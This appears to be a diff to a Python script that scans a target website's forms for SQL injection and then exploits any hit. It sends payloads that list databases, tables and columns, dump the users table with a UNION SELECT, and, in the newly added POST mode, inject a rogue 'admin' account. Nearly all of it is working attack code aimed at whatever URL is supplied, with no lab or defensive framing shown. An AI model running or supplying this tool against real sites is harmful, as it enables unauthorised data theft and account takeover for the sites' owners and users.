@@ -16,6 +16,7 @@ show_databases = "'); SHOW DATABASES; -- "
 show_table = "'); SHOW TABLES; -- "
 show_columns = "'); SHOW COLUMNS FROM users; -- "
 dump_all = "') UNION SELECT * FROM users -- "
+post_admin = "admin', 'whatever', 'hackmail') -- "
 
 
 if len(sys.argv) < 2:
@@ -25,12 +26,31 @@ if len(sys.argv) < 2:
 
 url = sys.argv[1]
 s = requests.Session()
+
 type_action = "get"
+storage_file = "default_storage.txt"
+
+for index, arg in enumerate(sys.argv[1:]):
+    if len(sys.argv) == index+2:
+        break
+    if arg == "-o":
+        storage_file = sys.argv[index+2]
+    elif arg == "-X":
+        type_action = sys.argv[index+2].lower()
+
+if type_action != "get" and type_action != "post":
+    print("invalid method")
+    exit(1)
+
 s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
 
 
 def get_all_forms(url):
-    soup = bs(s.get(url).content, "html.parser")
+    try:
+        soup = bs(s.get(url).content, "html.parser")
+    except:
+        print("Error with the url or the parser")
+        exit(1)
     forms = soup.find_all("form")
     for form in forms:
         if (type_action != form.get("method")):
@@ -54,8 +74,7 @@ def is_vulnerable(response):
     errors = {
         "you have an error in your sql syntax;",
         "warning: mysql",
-        "SQL error or missing"
-
+        "SQLite3"
     }
     for error in errors:
         if error in response.content.decode().lower():
@@ -69,7 +88,6 @@ def scan_sql_injection(url):
     for form in forms:
         form_details = get_form_details(form)
         for c in "')\"":
-            # the data body we want to submit
             data = {}
             for input_tag in form_details["inputs"]:
                 if input_tag["type"] == "text" or input_tag["type"] == "email":
@@ -86,17 +104,23 @@ def scan_sql_injection(url):
                 res = s.get(url, params=data)
             if is_vulnerable(res):
                 print(f"Injection vulnerability detected for: {url}. Form: \n{form_details}")
-                with open("show_databases.txt", "w") as f:
-                    injector(url, form_details, show_databases, f)
-                    injector(url, form_details, show_table, f)
-                    injector(url, form_details, show_columns, f)
-                    injector(url, form_details, dump_all, f)
+                try:
+                    with open(storage_file, "w") as f:
+                        if type_action == "get":
+                            get_injector(url, form_details, show_databases, f)
+                            get_injector(url, form_details, show_table, f)
+                            get_injector(url, form_details, show_columns, f)
+                            get_injector(url, form_details, dump_all, f)
+                        else:
+                            post_injector(url, form_details, post_admin)
+                except:
+                    print("File exception")
                 break
             else:
                 print("[!] SQL Injection no vulnerability detected:")
 
 
-def injector(url, form_details, injection, file):
+def get_injector(url, form_details, injection, file):
     data = {}
     for input_tag in form_details["inputs"]:
         if input_tag["type"] == "text" or input_tag["type"] == "email":
@@ -110,6 +134,22 @@ def injector(url, form_details, injection, file):
     res = res.content.decode().replace("<br>", "\n")
     res = res.replace("<br />", "\n")
     file.write(res)
+    print(res)
+
+
+def post_injector(url, form_details, injection):
+    data = {}
+    for input_tag in form_details["inputs"]:
+        if input_tag["type"] == "text" or input_tag["type"] == "email":
+            try:
+                data[input_tag["id"]] = injection
+            except:
+                pass
+            break
+    data[type_action] = ""
+    res = s.post(url, data=data)
+    res = res.content.decode().replace("<br>", "\n")
+    res = res.replace("<br />", "\n")
     print(res)
 
 
